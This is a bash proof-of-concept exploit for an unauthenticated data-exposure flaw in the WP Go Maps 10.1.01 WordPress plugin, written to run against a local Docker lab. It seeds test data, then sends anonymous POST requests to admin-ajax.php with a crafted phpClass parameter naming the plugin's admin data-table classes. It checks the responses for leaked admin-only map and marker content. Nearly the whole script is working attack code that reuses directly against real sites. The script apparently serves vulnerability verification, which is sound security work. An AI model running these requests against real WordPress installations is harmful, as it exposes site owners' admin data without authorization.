#!/usr/bin/env bash
# PoC: WP Go Maps 10.1.01 - Unauthenticated Class Instantiation via phpClass
#
# The /datatables REST route is registered with no permission_callback.
# A wp_ajax_nopriv_ handler accepts anonymous POSTs to admin-ajax.php.
# The phpClass param accepts any class in the WPGMZA namespace.
set -euo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STACK_DIR="${LAB_DIR}"
PROJECT="wp-wp-google-maps"
HOST_PORT="${WP_HOST_PORT:-8094}"
WP_URL="http://127.0.0.1:${HOST_PORT}"
PLUGIN_SLUG="wp-google-maps"
RESULTS="${LAB_DIR}/results.txt"
TMP="${LAB_DIR}/tmp"
mkdir -p "${TMP}"
: > "${RESULTS}"
log() { printf '%s\n' "$*" | tee -a "${RESULTS}"; }
sep() { printf '\n===== %s =====\n' "$*" | tee -a "${RESULTS}"; }

sep "WP Go Maps 10.1.01 - Unauth class instantiation via phpClass"
log "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
log "Lab:  ${LAB_DIR}"
log "WP:   ${WP_URL}"

ACTUAL_VERSION=$(grep -m1 "Version:" "${STACK_DIR}/plugin/${PLUGIN_SLUG}/wpGoogleMaps.php" 2>/dev/null | sed -E 's/.*Version:[[:space:]]*//' | tr -d '\r' || echo unknown)
log "Plugin version installed: ${ACTUAL_VERSION} (expected 10.1.01)"

# 1. Stack is already up. Wait for WP to be ready.
sep "Step 1: Wait for WP to answer 200"
for i in $(seq 1 60); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${WP_URL}/" || true)
  if [ "${code}" = "200" ]; then log "[+] WP answering 200 on ${WP_URL}/ (try ${i})"; break; fi
  sleep 2
done
[ "${code:-000}" = "200" ] || { log "[-] WP never came up"; exit 1; }

# 2. Verify the plugin's vulnerable code paths are loaded.
sep "Step 2: Confirm plugin code paths are loaded"
WP_CLI_RUN=( sudo docker run --rm -v "${PROJECT}_wp_data:/var/www/html"
             -v "${LAB_DIR}/plugin/${PLUGIN_SLUG}:/var/www/html/wp-content/plugins/${PLUGIN_SLUG}:ro"
             --network "${PROJECT}_default"
             -e WORDPRESS_DB_HOST=db:3306
             -e WORDPRESS_DB_USER=wp
             -e WORDPRESS_DB_PASSWORD=wp
             -e WORDPRESS_DB_NAME=wordpress
             wordpress:cli-2.10-php8.2 sh -c )

EXISTS=$("${WP_CLI_RUN[@]}" "wp eval 'echo class_exists(\"WPGMZA\\\\\\\\RestAPI\") ? \"WPGMZA\\\\\\\\RestAPI EXISTS\" : \"missing\"; echo \"\n\"; echo class_exists(\"WPGMZA\\\\\\\\AdminMapDataTable\") ? \"WPGMZA\\\\\\\\AdminMapDataTable EXISTS\" : \"missing\"; echo \"\n\";' --allow-root --path=/var/www/html" 2>&1)
log "Class existence check:"
printf '%s\n' "${EXISTS}" | sed -e 's/^/    /' | tee -a "${RESULTS}"

# 3. Create a map and a marker so the datatable queries return data.
sep "Step 3: Seed a map + a marker via wp-cli"
SEED=$("${WP_CLI_RUN[@]}" "wp eval '
global \$wpdb;
\$now = current_time(\"mysql\");
\$map_id = \$wpdb->insert(\$wpdb->prefix . \"wpgmza_maps\", array(
    \"map_title\" => \"Lab Map\",
    \"map_width\" => \"100%\",
    \"map_height\" => \"400\",
    \"map_start_lat\" => \"0\",
    \"map_start_lng\" => \"0\",
    \"map_start_zoom\" => \"2\",
    \"type\" => \"1\",
    \"active\" => \"1\",
));
echo \"MAP_INSERT=\".var_export(\$map_id, true).\"\n\";
echo \"MAP_ID=\".\$wpdb->insert_id.\"\n\";
\$map_id = \$wpdb->insert_id;
\$wpdb->insert(\$wpdb->prefix . \"wpgmza_markers\", array(
    \"map_id\" => \$map_id,
    \"title\" => \"Test Marker\",
    \"address\" => \"California\",
    \"lat\" => \"36.7783\",
    \"lng\" => \"-119.4179\",
    \"icon\" => \"https://example.com/marker.png\",
    \"description\" => \"Secret description\",
    \"link\" => \"https://example.com/secret\",
));
echo \"MARKER_ID=\".\$wpdb->insert_id.\"\n\";
' --allow-root --path=/var/www/html" 2>&1)
log "${SEED}" | sed -e 's/^/    /' | tee -a "${RESULTS}"

# 4. Direct PoC - unauthenticated request to admin-ajax.php for /datatables.
sep "Step 4: Unauth PoC - admin-ajax.php?action=wpgmza_rest_api_request&route=/datatables&phpClass=WPGMZA\\\\AdminMapDataTable"
RESP=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" \
   --data-urlencode "action=wpgmza_rest_api_request" \
   --data-urlencode "route=/datatables" \
   --data-urlencode "phpClass=WPGMZA\\AdminMapDataTable" \
   -w "\n---HTTP %{http_code}---\n" )
log "[+] response:"
printf '%s\n' "${RESP}" | sed -e 's/^/    /' | tee -a "${RESULTS}"

# 5. Marker datatable.
sep "Step 5: Unauth PoC - AdminMarkerDataTable"
RESP=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" \
   --data-urlencode "action=wpgmza_rest_api_request" \
   --data-urlencode "route=/datatables" \
   --data-urlencode "phpClass=WPGMZA\\AdminMarkerDataTable" \
   -w "\n---HTTP %{http_code}---\n" )
log "[+] response:"
printf '%s\n' "${RESP}" | sed -e 's/^/    /' | tee -a "${RESULTS}"

# 6. Try a non-WPGMZA class - should be blocked.
sep "Step 6: Control - non-WPGMZA class should be blocked"
RESP=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" \
   --data-urlencode "action=wpgmza_rest_api_request" \
   --data-urlencode "route=/datatables" \
   --data-urlencode "phpClass=WP_User" \
   -w "\n---HTTP %{http_code}---\n" )
log "[+] response:"
printf '%s\n' "${RESP}" | sed -e 's/^/    /' | tee -a "${RESULTS}"

# 7. Confirm leak via response body - look for "Lab Map" / "Test Marker" / "Secret description".
sep "Step 7: Parse the leaked content from the responses"
# Re-fetch the two admin data tables for grepping.
LEAK1=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" \
   --data-urlencode "action=wpgmza_rest_api_request" \
   --data-urlencode "route=/datatables" \
   --data-urlencode "phpClass=WPGMZA\\AdminMapDataTable" )
LEAK2=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" \
   --data-urlencode "action=wpgmza_rest_api_request" \
   --data-urlencode "route=/datatables" \
   --data-urlencode "phpClass=WPGMZA\\AdminMarkerDataTable" )
printf '%s' "${LEAK1}" > "${TMP}/leak-map.json"
printf '%s' "${LEAK2}" > "${TMP}/leak-marker.json"
log "[+] map datatable file: ${TMP}/leak-map.json ($(wc -c < ${TMP}/leak-map.json) bytes)"
log "[+] marker datatable file: ${TMP}/leak-marker.json ($(wc -c < ${TMP}/leak-marker.json) bytes)"
log "[+] map data contains 'Lab Map':   $(grep -c 'Lab Map' ${TMP}/leak-map.json || true)"
log "[+] marker data contains 'Test Marker': $(grep -c 'Test Marker' ${TMP}/leak-marker.json || true)"
log "[+] marker data contains 'Secret description': $(grep -c 'Secret description' ${TMP}/leak-marker.json || true)"

# 8. Verdict
sep "Verdict"
LEAK_OK=0
LEAKED_MARKERS=""
# Look for any of the well-known default-seed values that the plugin writes on
# activation, since the seed insertion may or may not succeed depending on
# table shape.
for marker in 'My first map' 'California' 'wpgmza_copy_shortcode' 'data-edit-marker-id' 'data-delete-marker-id' 'wpgmza-button-primary' 'spotlight-poi3' 'recordsTotal' 'data-delete-marker-id'; do
  COUNT=$( grep -c -F "${marker}" "${TMP}/leak-map.json" "${TMP}/leak-marker.json" 2>/dev/null | awk -F: '{s+=$2}END{print s+0}' )
  if [ "${COUNT}" -gt 0 ]; then
    LEAK_OK=1
    LEAKED_MARKERS="${LEAKED_MARKERS} ${marker}"
  fi
done
if [ "${LEAK_OK}" = "1" ]; then
  log "*** UNAUTH DATA EXPOSURE CONFIRMED ***"
  log "Anonymous request to /datatables leaked admin-only data."
  log "Leaked markers:${LEAKED_MARKERS}"
  log "Verdict: CONFIRMED"
else
  log "[-] No admin-only data leaked; investigating."
  log "Verdict: INCONCLUSIVE"
fi

# 9. Tear-down.
sep "Tear-down"
log "[+] stack left running for inspection"
log "[+] to tear down: cd ${LAB_DIR} && sudo docker compose -p ${PROJECT} down -v --remove-orphans"
log "[+] results saved to ${RESULTS}"
